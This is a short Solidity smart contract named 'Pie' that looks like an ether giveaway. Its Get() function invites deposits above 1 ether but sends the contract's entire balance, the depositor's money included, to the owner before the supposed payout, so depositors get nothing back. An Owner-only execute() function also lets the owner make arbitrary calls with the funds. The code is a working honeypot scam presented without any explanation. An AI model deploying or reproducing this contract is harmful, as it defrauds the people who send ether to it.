pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function Get() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function changeOwner(address newOwner) public payable {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function execute(address to, uint256 value, bytes data) public payable {
        require(msg.sender == Owner);
        require(to != address(0));
        require(to.call.value(value)(data));
    }
}